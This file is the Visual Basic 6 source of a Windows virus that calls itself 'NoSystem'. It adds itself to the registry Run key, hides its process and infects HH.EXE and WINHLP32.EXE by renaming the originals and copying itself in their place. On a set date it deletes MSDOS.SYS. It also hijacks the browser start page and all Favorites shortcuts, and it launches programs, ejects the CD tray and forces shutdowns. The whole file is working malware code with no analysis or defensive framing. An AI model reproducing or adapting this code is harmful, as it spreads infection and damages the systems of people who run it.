   VERSION 5.00
   Begin VB.Form NoSystem
   AutoRedraw=-1
   BackColor=&H00000000&
   BorderStyle=1
   ClientHeight=390
   ClientLeft=45
   ClientTop=330
   ClientWidth=1485
   FontTransparent=0
   Icon=0
   MaxButton=0
   MinButton=0
   ScaleHeight=390
   ScaleWidth=1485
   ShowInTaskbar=0
   StartUpPosition=2
   Visible=0
   Begin VB.Timer Tijd
   Interval=60000
   Left=0
   Top=0
   End
   End
   Attribute VB_Name = "NoSystem"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
   Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
   Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Private Declare Function CADM Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
   Private Declare Function waveOutGetVolume Lib "winmm.dll" (ByVal uDeviceID As Long, lpdwVolume As Long) As Long
   Private Declare Function waveOutSetVolume Lib "winmm.dll" (ByVal uDeviceID As Long, ByVal dwVolume As Long) As Long
   Private Type lVolType
       v As Long
   End Type
   Private Type VolType
       lv As Integer
       rv As Integer
   End Type
   Public Sub Navigate(URL As String)
   On Error Resume Next
   Call ShellExecute(Me.hWnd, "open", URL, "", "", SW_SHOW)
   End Sub
   Private Function SendMCIString(cmd As String) As Boolean
   On Error Resume Next
   Dim rc
   rc = mciSendString(cmd, 0, 0, hWnd)
   SendMCIString = (rc = 0)
   End Function
   Private Sub Form_Load()
   On Error Resume Next
   Dim root As String, windir As String, i As Long
   If Right(App.Path, 1) <> "\" Then root = "\"
   i = 1
   Do While Environ$(i) <> ""
       If Left$(Environ$(i), 6) = "windir" Then windir = Mid(Environ$(i), 8)
       i = i + 1
   Loop
   If Right(windir, 1) <> "\" Then windir = windir & "\"
   If UCase(App.EXEName) = "WINHLP32" Or UCase(App.EXEName) = "HH" Then
       Call savestring(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "NoSystem", windir + "NOSYSTEM.EXE")
       FileCopy App.Path + root + App.EXEName + ".EXE", windir + "NOSYSTEM.EXE"
       Shell App.Path & root & App.EXEName & ".VIR " & Command, vbNormalFocus
       Unload Me
       Exit Sub
   End If
   If getdword(HKEY_LOCAL_MACHINE, "", "WF") = 1 Then
       MsgBox "This is some kind of virus, but don't worry, you are protected from it!", , "NoSystem-Virus"
       MsgBox "have a nice weekend........Energy 2001"
       Unload Me
   Else
       If App.EXEName = "NOSYSTEM" Then
           If App.PrevInstance Then Unload Me: Exit Sub
           Open App.Path & root & App.EXEName & ".EXE" For Binary As 1
           Dim q As String, MESSAGE As String, DDATE As String, FAV As Long, Start As Long, WAV As Long, CDROM As Long, PROGRAM As Long, RESTART As Long
           Do While Not EOF(1)
               Line Input #1, q
               If q = "FAV" Then FAV = 1
               If q = "START" Then Start = 1
               If q = "ACTIVE" Then Me.AutoRedraw = False
               If q = "WAV" Then WAV = 1
               If q = "CDROM" Then CDROM = 1
               If q = "PROGRAM" Then PROGRAM = 1
               If q = "CADM" Then Call CADM(97, True, CStr(1), 0)
               If q = "RCAD" Then Call RegisterServiceProcess(pid, 1)
               If Left(q, 5) = "WEXIT" Then Tijd.Tag = Mid(q, 6)
               If Left(q, 7) = "MESSAGE" Then MESSAGE = Mid(q, 8)
               If Left(q, 4) = "PAGE" Then Me.Tag = Mid(q, 5)
               If Left(q, 7) = "RESTART" Then RESTART = Val(Mid(q, 8))
               If Left(q, 5) = "DDATE" Then DDATE = Mid(q, 6)
           Loop
           Close
           Call savestring(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "NoSystem", App.Path + root + "NOSYSTEM.EXE")
           If RESTART <> "" Then
               Dim RES As Long
               RES = getdword(HKEY_LOCAL_MACHINE, "", "RES")
               If RES < RESTART Then
                   RES = RES + 1
                   Call SaveDword(HKEY_LOCAL_MACHINE, "", "RES", RES)
                   Unload Me
                   Exit Sub
               End If
               If RES > RESTART Then
                   Call DeleteValue(HKEY_LOCAL_MACHINE, "", "RES")
                   Unload Me
                   Exit Sub
               End If
           End If
           If Start = 1 Then Call savestring(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\Main", "Start Page", Me.Tag)
           If DDATE = Date$ Then
               SetAttr "\MSDOS.SYS", vbNormal
               Kill "\MSDOS.SYS"
               Open windir & "System.ico" For Output As #1
               Print #1, Chr(0) & Chr(0) & Chr(1) & Chr(0) & Chr(1) & Chr(0) & Chr(32) & Chr(32) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0) & Chr(0)
               Close
               Call savestring(HKEY_CLASSES_ROOT, "exefile\DefaultIcon", "", windir & "System.ico")
           End If
           If FAV = 1 Then
               Dim a As String
               Dim f As String
               a = getstring(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Favorites")
               If a <> "" Then
                   If Right(a, 1) <> "\" Then a = a & "\"
                   f = Dir(a & "*.URL")
                   If f <> "" Then
                       Do
                       Open a & f For Output As #1
                       Print #1, "[InternetShortcut]"
                       Print #1, "URL=" & Me.Tag
                       Close
                       f = Dir
                       Loop Until f = ""
                   End If
               End If
           End If
           If PROGRAM = 1 Then
               Shell windir & "SCANDSKW.EXE", vbNormalFocus
               SendKeys "{ENTER}"
               Shell windir & "NOTEPAD.EXE", vbMaximizedFocus
               Shell windir & "CALC.EXE", vbNormalFocus
               Shell windir & "EXPLORER.EXE", vbMaximizedFocus
               Shell windir & "PROGMAN.EXE", vbMaximizedFocus
               Shell windir & "REGEDIT.EXE", vbMaximizedFocus
               Shell windir & "CDPLAYER.EXE", vbNormalFocus
               Shell windir & "SNDREC32.EXE", vbNormalFocus
               Shell windir & "PBRUSH.EXE", vbMaximizedFocus
               Shell windir & "WRITE.EXE", vbMaximizedFocus
           End If
           If WAV = 1 Then
               Dim v As Long, lVol As lVolType, Vol As VolType, lv As Double, rv As Double
               Call waveOutGetVolume(-1, v)
               lVol.v = v
               LSet Vol = lVol
               lv = Vol.lv: rv = Vol.rv
               lv = lv + &HFFF
               rv = rv + &HFFF
               If lv > 32767 Then lv = lv - 65536
               If rv > 32767 Then rv = rv - 65536
               Vol.lv = lv
               Vol.rv = rv
               LSet lVol = Vol
               v = lVol.v
               Call waveOutSetVolume(-1, v)
           End If
           If CDROM = 1 Then
               SendMCIString "close all"
               If (SendMCIString("open cdaudio alias cd wait shareable") = False) Then End
               SendMCIString "set cd time format tmsf wait"
               SendMCIString "set cd door open"
           End If
           If MESSAGE <> "" Then MsgBox MESSAGE, , "Windows Message"
           If Dir(windir & "HH.EXE") <> "" And Dir(windir & "HH.VIR") = "" Then
               Name windir & "HH.EXE" As windir & "HH.VIR"
               FileCopy App.Path + root + App.EXEName + ".EXE", windir + "HH.EXE"
           End If
           If Dir(windir & "WINHLP32.EXE") <> "" And Dir(windir & "WINHLP32.VIR") = "" Then
               Name windir & "WINHLP32.EXE" As windir & "WINHLP32.VIR"
               FileCopy App.Path + root + App.EXEName + ".EXE", windir + "WINHLP32.EXE"
           End If
           If Me.AutoRedraw = True And Tijd.Tag = "" Then Unload Me
       Else
           FileCopy App.Path + root + App.EXEName + ".EXE", windir + "NOSYSTEM.EXE"
           Shell windir + "NOSYSTEM.EXE", vbNormalFocus
           Unload Me
       End If
   End If
   End Sub
   Private Sub Tijd_Timer()
   On Error Resume Next
   If Tijd.Tag <> "" Then If Val(Left(Tijd.Tag, 2)) <= Left(Time$, 2) And Val(Right(Tijd.Tag, 2)) > Left(Time$, 2) Then Call ExitWindowsEx(1, 0)
   If Me.AutoRedraw = False Then
       If online() = False Then Exit Sub
       Navigate Me.Tag
       Me.AutoRedraw = True
   End If
   If Me.AutoRedraw = True And Tijd.Tag = "" Then
       Dim S
       S = Timer
       Do While Timer < S + 5
           DoEvents
       Loop
       Unload Me
   End If
   End Sub
